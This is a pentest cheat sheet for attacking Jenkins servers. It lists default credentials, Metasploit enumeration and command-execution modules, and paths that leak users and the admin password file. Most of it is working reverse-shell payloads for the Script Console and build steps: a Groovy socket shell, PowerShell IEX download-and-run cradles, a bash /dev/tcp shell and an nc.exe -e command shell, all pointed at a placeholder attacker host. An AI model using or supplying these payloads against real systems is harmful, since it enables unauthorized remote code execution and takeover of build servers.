# jenkins

## Default Credentails

```bash
admin:password
jenkins:jenkins
```

## Enumeration

### msf

* jenkins_enum: `use auxiliary/scanner/http/jenkins_enum`
* unauthenticated command execution: `use auxiliary/scanner/http/jenkins_command`

### Interesting Paths

```bash
# version check
/oops
/err

# without credentials, lists current users
/people
/asynchPeople/
/securityRealm/user/admin/search/index?q=USERNAME

# password file in windows
C:\Users\Administrator\.jenkins\secrets\initialAdminPassword
```

## Shell (authenticated)

### Groovy Script Console Method

Manage Jenkins > Script Console

```bash
# universal
String host="IP";
int port=6969;
String cmd="/bin/bash";
# String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

# WINDOWS
cmd = """ powershell "IEX(New-Object Net.WebClient).downloadString('http://IP/shell.ps1')" """
println cmd.execute().text

# LINUX
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/IP/PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### New Project Method (Windows)

New Item > Freestyle Project > Build > Add Build Step > Execute Windows Batch Command

```powershell
powershell iex (New-Object System.Net.WebClient).DownloadString('http://IP/shell.ps1')

powershell wget "http://IP/nc.exe" -outFile "nc.exe"
nc.exe -e cmd.exe IP PORT
```